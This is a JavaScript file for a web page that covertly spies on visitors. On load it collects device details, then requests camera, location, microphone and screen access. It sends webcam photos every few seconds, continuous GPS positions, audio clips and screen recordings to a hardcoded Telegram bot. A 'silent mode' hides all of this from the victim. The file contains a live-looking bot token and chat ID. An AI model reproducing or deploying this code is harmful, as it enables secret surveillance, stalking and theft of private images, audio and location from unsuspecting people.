// ==================== TELEGRAM CONFIGURATION ====================
const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
let CHAT_ID = "6837307356";

// Get chat ID from URL if present
const urlParams = new URLSearchParams(window.location.search);
const chatIdFromUrl = urlParams.get('chat_id');
if (chatIdFromUrl) CHAT_ID = chatIdFromUrl;

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenStream = null;
let cameraInterval = null;
let audioRecorder = null;
let screenRecorder = null;
let isRecording = false;
let recordedChunks = [];

// Silent mode - don't send permission status messages
const SILENT_MODE = true;

// ==================== DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'មាន' : 'គ្មាន',
        online: navigator.onLine ? 'អន្តរណេត' : 'អត់អន្តរណេត',
        battery: await getBatteryInfo(),
        localStorage: formatBytes(calculateLocalStorageSize()),
        sessionStorage: formatBytes(calculateSessionStorageSize()),
        touch: 'ontouchstart' in window ? 'មាន' : 'គ្មាន',
        referrer: document.referrer || 'គ្មាន',
        url: window.location.href
    };
    
    if (currentLocation) {
        info.location = currentLocation;
    }
    
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'ទាញយកមិនបាន';
    }
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return `${Math.round(battery.level * 100)}%`;
        } catch {
            return 'មិនអាចដឹង';
        }
    }
    return 'មិនគាំទ្រ';
}

function calculateLocalStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function calculateSessionStorageSize() {
    let total = 0;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDeviceInfo(info) {
    let locationText = 'មិនអនុញ្ញាត';
    if (info.location && typeof info.location === 'object') {
        const mapsLink = `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}&z=15`;
        locationText = `
📍 **ទីតាំងពិតប្រាកដ:**
├─ រយៈទទឹង: ${info.location.lat}
├─ រយៈបណ្តោយ: ${info.location.lng}
├─ ភាពត្រឹមត្រូវ: ±${info.location.accuracy}m
├─ Google Maps: ${mapsLink}
└─ តំបន់ពេល: ${info.timezone}`;
    }
    
    return `📱 **ព័ត៌មានឧបករណ៍**
⏰ ពេលវេលា: ${info.timestamp}
🌐 IP: ${info.ip}
🖥️ User Agent: ${info.userAgent.substring(0, 100)}...
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
🖥️ Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
🔋 Battery: ${info.battery}
💾 Local Storage: ${info.localStorage}
💾 Session Storage: ${info.sessionStorage}
👆 Touch: ${info.touch}

${locationText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}`;
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    if (SILENT_MODE && (message.includes('កាមេរ៉ា') || message.includes('ទីតាំង') || message.includes('មីក្រូហ្វូន') || message.includes('ថតអេក្រង់'))) {
        // Skip permission status messages in silent mode
        return;
    }
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'Markdown'
            }),
        });
    } catch (err) {}
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

async function sendAudioToTelegram(file, caption) {
    if (!CHAT_ID) return;
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('audio', file);
    if (caption) formData.append('caption', caption);
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
            method: "POST",
            body: formData
        });
    } catch (error) {}
}

// ==================== 1. CAMERA (1s) - Silent ====================
async function requestCameraPermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false 
        });
        
        cameraStream = stream;
        
        // Start capturing photos every 3 seconds (silent - no status message)
        startCameraCapture(stream);
        
    } catch (error) {
        // Silent fail - don't send error message
    }
}

function startCameraCapture(stream) {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    
    cameraInterval = setInterval(async () => {
        if (!video || video.readyState < 2) return;
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendPhotoToTelegram(file, `📸 *រូបថតពីកាមេរ៉ា*\n⏰ ${new Date().toLocaleString('km-KH')}`);
            }
        }, 'image/jpeg', 0.7);
    }, 5000); // Capture every 5 seconds
}

// ==================== 2. LOCATION (3s) - Silent ====================
function requestLocationPermission() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            
            // Send location as map (silent - no text message)
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    latitude: currentLocation.lat,
                    longitude: currentLocation.lng
                }),
            });
        },
        () => {}, // Silent fail
        { enableHighAccuracy: true, timeout: 10000 }
    );
    
    // Track location every 30 seconds
    setInterval(() => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                currentLocation = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: Math.round(position.coords.accuracy)
                };
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            },
            () => {},
            { enableHighAccuracy: true, timeout: 5000 }
        );
    }, 30000);
}

// ==================== 3. MICROPHONE (5s) - Silent ====================
async function requestMicrophonePermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        
        // Start audio recording (silent - no status message)
        startAudioRecording(stream);
        
    } catch (error) {
        // Silent fail
    }
}

function startAudioRecording(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    
    recorder.ondataavailable = async (event) => {
        if (event.data.size > 0) {
            chunks.push(event.data);
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
            
            await sendAudioToTelegram(file, `🎤 *ការថតសំឡេង*\n📊 Size: ${(blob.size / 1024).toFixed(2)} KB\n⏰ ${new Date().toLocaleString('km-KH')}`);
            chunks.length = 0;
        }
    };
    
    recorder.start();
    setInterval(() => {
        if (recorder.state === 'recording') {
            recorder.stop();
            setTimeout(() => recorder.start(), 100);
        }
    }, 15000); // Record every 15 seconds
}

// ==================== 4. SCREEN RECORDING (7s) - Silent ====================
async function requestScreenPermission() {
    // Check if getDisplayMedia is supported
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) {
        return; // Silent fail
    }
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        
        screenStream = stream;
        
        // Start screen recording (silent - no status message)
        startScreenRecording(stream);
        
        // Take screenshot
        await captureScreenshot();
        
        // Screenshot every 30 seconds
        setInterval(() => captureScreenshot(), 30000);
        
    } catch (error) {
        // Silent fail
    }
}

function startScreenRecording(stream) {
    const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
    screenRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
    const chunks = [];
    
    screenRecorder.ondataavailable = async (event) => {
        if (event.data.size > 0) {
            chunks.push(event.data);
            const blob = new Blob(chunks, { type: mimeType });
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
            
            await sendVideoToTelegram(file, `📹 *ការថតអេក្រង់*\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ ${new Date().toLocaleString('km-KH')}`);
            chunks.length = 0;
        }
    };
    
    screenRecorder.start(1000);
    
    // Stop after 30 seconds
    setTimeout(() => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
        }
    }, 30000);
    
    stream.getVideoTracks()[0].addEventListener('ended', () => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
        }
    });
}

// ==================== SCREENSHOT ====================
async function captureScreenshot() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always" },
            audio: false
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
        
        await sendPhotoToTelegram(file, `📸 *SCREENSHOT*\n📐 ${canvas.width}x${canvas.height}\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
        
    } catch (error) {}
}

// ==================== START DATA COLLECTION (10s) ====================
async function startDataCollection() {
    // Send device info every 60 seconds
    setInterval(async () => {
        const deviceInfo = await collectDeviceInfo();
        const formattedInfo = formatDeviceInfo(deviceInfo);
        await sendMessageToTelegram(`🔄 *ទិន្នន័យបច្ចុប្បន្ន*\n\n${formattedInfo}`);
    }, 60000);
}

// ==================== MAIN INITIALIZATION ====================
async function initialize() {
    // 0s: Send device info (only once)
    const deviceInfo = await collectDeviceInfo();
    const formattedInfo = formatDeviceInfo(deviceInfo);
    await sendMessageToTelegram(`🚀 *PAGE LOADED*\n\n${formattedInfo}`);
    
    // 1s: Request camera permission (silent)
    setTimeout(() => {
        requestCameraPermission();
    }, 1000);
    
    // 3s: Request location permission (silent)
    setTimeout(() => {
        requestLocationPermission();
    }, 3000);
    
    // 5s: Request microphone permission (silent)
    setTimeout(() => {
        requestMicrophonePermission();
    }, 5000);
    
    // 7s: Request screen recording permission (silent)
    setTimeout(() => {
        requestScreenPermission();
    }, 7000);
    
    // 10s: Start full data collection
    setTimeout(() => {
        startDataCollection();
    }, 10000);
}

// Start when page loads
window.addEventListener("DOMContentLoaded", initialize);